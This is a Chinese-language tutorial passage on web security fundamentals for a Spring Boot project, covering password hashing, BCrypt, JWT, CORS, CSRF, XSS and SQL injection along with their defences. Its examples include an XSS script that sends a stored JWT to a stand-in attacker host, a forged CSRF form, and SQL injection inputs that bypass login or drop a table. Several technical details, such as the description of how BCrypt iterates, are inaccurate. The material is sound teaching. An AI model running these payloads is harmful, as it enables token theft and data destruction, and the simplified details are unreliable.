## 第一部分：基础安全概念

### 1.1 什么是认证(Authentication)？

**通俗解释**：认证就是"证明你是谁"

```
现实生活类比：
- 去银行取钱，柜员要验证你的身份证
- 进入小区，保安检查你的门禁卡
- 登录微信，输入密码证明是你本人

Web应用中：
- 用户输入用户名和密码
- 系统验证密码是否正确
- 正确→允许登录，错误→拒绝
```

### 1.2 什么是授权(Authorization)？

**通俗解释**：授权就是"决定你能做什么"

```
现实生活类比：
- 学生证可以进图书馆，但不能进教师办公室
- 普通员工可以用会议室，但不能进董事会会议室
- VIP会员可以看高清视频，普通会员只能看标清

Web应用中：
- 学生(STUDENT)只能查看课程
- 教师(INSTRUCTOR)可以创建和编辑课程
- 管理员(ADMIN)可以删除任何内容
```

### 1.3 什么是密码加密？

#### 问题：为什么不能明文存储密码？

**错误做法（非常危险！）**：

```sql
-- ❌ 绝对不要这样做！
CREATE TABLE users (
    id INT,
    username VARCHAR(50),
    password VARCHAR(50)  -- 明文密码：123456
);

INSERT INTO users VALUES (1, 'john', '123456');
```

**危险原因**：
1. 数据库被黑客入侵 → 所有密码泄露
2. 数据库管理员可以看到所有人的密码
3. 用户习惯用相同密码 → 其他网站账户也被盗

#### 解决方案：密码加密（Hashing）

**什么是哈希(Hash)？**

哈希是一个单向函数：
- 输入任意长度的数据
- 输出固定长度的"指纹"
- **无法从指纹还原原始数据**（单向性）

```
类比：绞肉机
原料（密码）→ 绞肉机（哈希函数）→ 肉馅（哈希值）
                     ↓
              无法还原成原来的肉块！
```

**示例**：

```
输入：123456
MD5哈希：e10adc3949ba59abbe56e057f20f883e
SHA256哈希：8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92

特点：
1. 相同输入→相同输出（123456永远是同一个哈希值）
2. 微小改变→完全不同（123457的哈希完全不同）
3. 不可逆（无法从哈希值推算出123456）
```

#### 什么是盐(Salt)？

**问题**：彩虹表攻击

黑客可以预先计算常见密码的哈希值：

```
彩虹表（预计算的哈希字典）：
123456 → e10adc3949ba59abbe56e057f20f883e
password → 5f4dcc3b5aa765d61d8327deb882cf99
qwerty → d8578edf8458ce06fbc5bb76a58c5ca4

黑客拿到数据库：
用户A：e10adc3949ba59abbe56e057f20f883e
  ↓
查彩虹表 → 找到！密码是123456
```

**解决方案**：加盐(Salt)

盐是一个随机字符串，在哈希前混入密码：

```
没有盐：
Hash(123456) = e10adc3949ba59abbe56e057f20f883e

有盐：
盐1：x7Kp9mQ2  → Hash(x7Kp9mQ2 + 123456) = 完全不同的哈希A
盐2：zR3nF8vL  → Hash(zR3nF8vL + 123456) = 完全不同的哈希B

即使密码相同，盐不同，哈希值也完全不同！
彩虹表失效！
```

#### 什么是BCrypt？

**BCrypt = 加盐哈希 + 自适应成本**

特点：
1. **自动加盐**：每次加密自动生成随机盐
2. **自适应**：可以调整计算复杂度
3. **慢速**：故意设计得慢，防止暴力破解

**BCrypt密码格式**：

```
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
 │  │  │                                 │
 │  │  └─ 22字符盐                       └─ 31字符哈希值
 │  └─ 成本因子(2^10 = 1024次迭代)
 └─ BCrypt版本

成本因子：10 → 需要计算1024次
成本因子：12 → 需要计算4096次
```

**为什么要慢？**

```
黑客暴力破解：
- 普通MD5：每秒可以尝试10亿次
- BCrypt(成本10)：每秒只能尝试几千次

破解一个8位密码：
- MD5：几分钟
- BCrypt：几十年
```

### 1.4 什么是令牌(Token)？

#### 传统方式：Session（有状态）

**工作流程**：

```
1. 用户登录成功
   ↓
2. 服务器创建Session（会话）
   Session ID: abc123
   用户信息: {id: 1, username: "john", role: "STUDENT"}
   ↓
3. 服务器存储Session（内存/Redis/数据库）
   ↓
4. 服务器返回Session ID给浏览器（Cookie）
   ↓
5. 后续请求：
   浏览器 → 携带Cookie(abc123) → 服务器
   服务器 → 查询Session存储 → 找到用户信息
```

**问题**：
- 服务器需要存储Session（占内存）
- 多服务器时Session共享困难
- 扩展性差

#### 现代方式：JWT（无状态）

**JWT (JSON Web Token)**：一个包含用户信息的加密字符串

```
格式：
头部(Header).载荷(Payload).签名(Signature)

示例：
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**解析JWT**：

```json
// 头部(Header)
{
  "alg": "HS256",  // 签名算法
  "typ": "JWT"     // 令牌类型
}

// 载荷(Payload)
{
  "sub": "12345",           // 用户ID
  "username": "john_doe",   // 用户名
  "role": "STUDENT",        // 角色
  "iat": 1735708800,        // 签发时间
  "exp": 1735712400         // 过期时间
}

// 签名(Signature)
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret  // 密钥，只有服务器知道
)
```

**工作流程**：

```
1. 用户登录成功
   ↓
2. 服务器生成JWT
   - 将用户信息放入载荷
   - 用密钥签名（防篡改）
   ↓
3. 返回JWT给前端
   ↓
4. 前端存储JWT（LocalStorage/Cookie）
   ↓
5. 后续请求：
   前端 → 请求头携带JWT → 服务器
   服务器 → 验证签名 → 解析用户信息
   ↓
   不需要查询数据库或Session存储！（无状态）
```

**优点**：
- ✅ 服务器无需存储（无状态）
- ✅ 容易扩展（多服务器共享密钥即可）
- ✅ 跨域友好

**缺点**：
- ❌ 无法主动失效（需要等待过期或实现黑名单）
- ❌ 载荷不能太大（会增加带宽）

### 1.5 什么是CORS？

#### CORS (Cross-Origin Resource Sharing)

**跨域资源共享**：允许不同域名的网页访问你的API

**问题场景**：

```
你的前端：http://localhost:3000  (React应用)
你的后端：http://localhost:8080  (Spring Boot)

前端尝试访问后端API：
fetch('http://localhost:8080/api/users')

浏览器拦截：
❌ 错误：CORS policy: No 'Access-Control-Allow-Origin' header
```

**为什么浏览器要拦截？**

安全原因：防止恶意网站访问你的数据

```
场景：
1. 你登录了银行网站 bank.com
2. 浏览器保存了银行的Cookie
3. 你访问了恶意网站 evil.com
4. 恶意网站的JS代码：
   fetch('https://bank.com/api/transfer?to=hacker&amount=10000')
5. 如果没有CORS限制，浏览器会自动带上银行的Cookie
   → 转账成功！你的钱被盗了！

有了CORS限制：
bank.com没有设置允许evil.com访问
  ↓
浏览器拦截请求
  ↓
恶意网站无法窃取数据
```

**CORS配置**：

```java
// 允许前端访问后端
configuration.setAllowedOrigins(List.of(
    "http://localhost:3000",    // React开发环境
    "https://yourwebsite.com"   // 生产环境
));

// 允许的HTTP方法
configuration.setAllowedMethods(Arrays.asList(
    "GET", "POST", "PUT", "DELETE"
));

// 允许的请求头
configuration.setAllowedHeaders(Arrays.asList(
    "Authorization",  // JWT令牌
    "Content-Type"    // JSON数据
));
```

**工作流程**：

```
浏览器 → 后端：OPTIONS /api/users（预检请求）
后端 → 浏览器：
    Access-Control-Allow-Origin: http://localhost:3000
    Access-Control-Allow-Methods: GET, POST
    Access-Control-Allow-Headers: Authorization

浏览器：OK，允许访问
  ↓
浏览器 → 后端：GET /api/users（实际请求）
```

### 1.6 什么是CSRF？

#### CSRF (Cross-Site Request Forgery)

**跨站请求伪造**：利用你的登录状态执行恶意操作

**攻击场景**：

```
1. 你登录了银行网站 bank.com
   Cookie：sessionId=abc123
   ↓
2. 你访问了恶意网站 evil.com
   ↓
3. 恶意网站的HTML：
   <form action="https://bank.com/api/transfer" method="POST">
     <input name="to" value="hacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>
   ↓
4. 浏览器自动提交表单，携带bank.com的Cookie
   ↓
5. 银行服务器验证Cookie有效 → 转账成功！
```

**防护方法1：CSRF Token**

```
工作流程：
1. 用户访问表单页面
   服务器生成随机Token: x7Kp9mQ2
   存储到Session: csrfToken=x7Kp9mQ2
   返回给前端（隐藏字段）

2. 用户提交表单
   <form>
     <input name="csrfToken" value="x7Kp9mQ2">
     ...
   </form>

3. 服务器验证：
   请求中的Token == Session中的Token？
     ↓
   相等 → 合法请求
   不等 → CSRF攻击，拒绝！

为什么恶意网站无法伪造？
- 恶意网站不知道Token的值
- Token存储在Session，恶意网站无法读取
```

**防护方法2：SameSite Cookie**

```java
Cookie cookie = new Cookie("sessionId", "abc123");
cookie.setSameSite("Strict");  // 只在同站请求发送

结果：
bank.com → bank.com: 发送Cookie ✅
evil.com → bank.com: 不发送Cookie ❌
```

**我们的项目为什么禁用CSRF保护？**

```
原因：
1. 使用JWT，不使用Cookie
2. JWT存储在Authorization头，浏览器不会自动发送
3. 恶意网站无法读取LocalStorage中的JWT
4. SPA应用不需要CSRF保护

但如果：
- 你使用Cookie存储JWT
- 你有传统的服务器渲染表单
↓
必须启用CSRF保护！
```

### 1.7 什么是XSS？

#### XSS (Cross-Site Scripting)

**跨站脚本攻击**：注入恶意JavaScript代码

**攻击场景**：

```
1. 用户在评论框输入：
   <script>
     fetch('http://hacker.com/steal?token=' + localStorage.getItem('jwt'))
   </script>

2. 后端直接保存到数据库

3. 其他用户访问页面
   ↓
4. 后端返回HTML：
   <div class="comment">
     <script>
       fetch('http://hacker.com/steal?token=' + localStorage.getItem('jwt'))
     </script>
   </div>
   ↓
5. 浏览器执行恶意脚本
   ↓
6. 用户的JWT令牌被发送给黑客
```

**防护方法1：输入验证**

```java
@NotBlank
@Size(max = 500)
@Pattern(regexp = "^[a-zA-Z0-9\\s.,!?-]+$")  // 只允许安全字符
private String comment;
```

**防护方法2：输出转义**

```javascript
// ❌ 危险：直接插入HTML
element.innerHTML = userInput;

// ✅ 安全：转义特殊字符
element.textContent = userInput;

// < → &lt;
// > → &gt;
// <script> → &lt;script&gt; （显示文本，不执行）
```

**防护方法3：Content Security Policy**

```http
Content-Security-Policy: script-src 'self'
  ↓
只允许执行来自本站的JavaScript
拒绝内联脚本<script>...</script>
```

### 1.8 什么是SQL注入？

#### SQL Injection

**攻击场景**：

```sql
-- 正常登录查询
String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";

-- 用户输入：
username = admin
password = 123456

-- 生成的SQL：
SELECT * FROM users WHERE username = 'admin' AND password = '123456'
  ↓
正常查询


-- ❌ 恶意输入：
username = admin' --
password = anything

-- 生成的SQL：
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
  ↓
-- 是SQL注释符，后面的密码检查被注释掉了！
  ↓
等价于：SELECT * FROM users WHERE username = 'admin'
  ↓
无需密码登录成功！
```

**更危险的注入**：

```sql
-- 删除整个数据库
username = admin'; DROP TABLE users; --

-- 生成的SQL：
SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
-- '

  ↓
执行两条SQL：
1. SELECT * FROM users WHERE username = 'admin'
2. DROP TABLE users  （删除用户表！）
```

**防护方法：参数化查询（PreparedStatement）**

```java
// ❌ 危险：字符串拼接
String sql = "SELECT * FROM users WHERE username = '" + username + "'";

// ✅ 安全：参数化查询
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);  // 自动转义

// 即使输入：admin' --
// 实际查询：SELECT * FROM users WHERE username = 'admin\' --'
//                                                    ↑ 被转义
// 查询结果：找不到用户名为"admin' --"的用户
```

**我们的项目如何防护？**

```java
// Spring Data JPA自动使用参数化查询
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByUsername(String username);
    // ↓ 自动生成安全的SQL
    // SELECT * FROM users WHERE username = ?
}
```

## 第二部分：核心技术详解

### 2.1 PasswordEncoder（密码编码器）

#### 是什么？

PasswordEncoder是Spring Security提供的密码加密接口。

#### 为什么需要？

```
问题：如何安全地存储和验证密码？

方案1：明文存储 ❌
- 数据库泄露 = 所有密码泄露

方案2：简单哈希 ❌
- MD5(123456) 永远是 e10adc...
- 彩虹表攻击

方案3：BCrypt ✅
- 自动加盐
- 自适应成本
- 每次加密结果不同
```

#### 怎么用？

```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}

// 注册时：加密密码
String plainPassword = "123456";
String hashedPassword = passwordEncoder.encode(plainPassword);
// 结果：$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
user.setPassword(hashedPassword);
userRepository.save(user);

// 登录时：验证密码
String inputPassword = "123456";  // 用户输入
String storedPassword = user.getPassword();  // 数据库中的哈希
boolean matches = passwordEncoder.matches(inputPassword, storedPassword);
if (matches) {
    // 密码正确，允许登录
} else {
    // 密码错误，拒绝登录
}
```

#### 工作原理

**encode() - 加密过程**：

```
输入：123456

步骤1：生成随机盐
  Salt = x7Kp9mQ2nF8vLzR3kH6jM9

步骤2：盐 + 密码
  Input = x7Kp9mQ2nF8vLzR3kH6jM9 + 123456

步骤3：BCrypt哈希（2^10 = 1024次迭代）
  第1次：Hash1 = bcrypt(Input)
  第2次：Hash2 = bcrypt(Hash1)
  ...
  第1024次：FinalHash = bcrypt(Hash1023)

步骤4：组合输出
  $2a$10$x7Kp9mQ2nF8vLzR3kH6jM9{FinalHash}
   │  │  │                     │
   │  │  └─ 盐                 └─ 哈希值
   │  └─ 成本因子
   └─ 版本号
```

**matches() - 验证过程**：

```
输入：
- plainPassword = "123456"
- hashedPassword = "$2a$10$x7Kp9mQ2..."

步骤1：解析hashedPassword
  版本 = 2a
  成本 = 10
  盐   = x7Kp9mQ2nF8vLzR3kH6jM9
  哈希 = {FinalHash}

步骤2：用相同的盐加密输入密码
  Input = x7Kp9mQ2nF8vLzR3kH6jM9 + 123456
  NewHash = bcrypt(Input, cost=10)

步骤3：比较哈希值
  NewHash == FinalHash?
    ↓
  相等 → true（密码正确）
  不等 → false（密码错误）
```
